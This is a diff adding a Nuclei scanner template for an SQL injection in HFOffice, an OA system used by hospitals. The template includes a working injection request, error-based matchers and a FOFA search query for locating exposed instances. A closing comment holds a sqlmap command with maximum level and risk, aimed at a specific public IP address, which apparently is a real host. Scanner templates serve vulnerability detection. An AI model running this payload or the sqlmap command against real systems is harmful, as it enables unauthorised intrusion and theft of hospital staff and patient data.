@@ -1,0 +1,40 @@
+id: hongfan-hoffice-switch-value-list-sqli
+
+info:
+  name: 红帆 HFOffice 医微云 /api/switch-value/list - sqli
+  author: leadlife
+  severity: high
+  description: 红帆 HFOffice 是一款广泛应用于医院的OA系统，其某api接口存在SQL注入漏洞。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: title="HFOffice"
+  tags: hongfan,sqli,hoffice,oa
+
+http:
+  - raw:
+      - |
+        GET /api/switch-value/list?sorts=%5B%7B%22Field%22:%221-CONVERT(VARCHAR(32),%20HASHBYTES(%27MD5%27,%20%271234%27),%202);%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c69905a7 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
+        Connection: close
+        Accept: /
+        Accept-Language: en
+        Accept-Encoding: gzip
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 400
+          - contains(body, '内部错误')
+        condition: and
+      
+      - type: dsl
+        dsl:
+          - status_code == 400
+          - contains(body, '附近有语法错误')
+        condition: and
+
+# sqlmap -u "http://106.15.250.152:8081/api/switch-value/list?sorts=%5B%7B%22Field%22:%221*,%202);%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c69905a7" --level 5 --risk 3  --dbms=mssql --tamper=space2comment --batch --technique=S
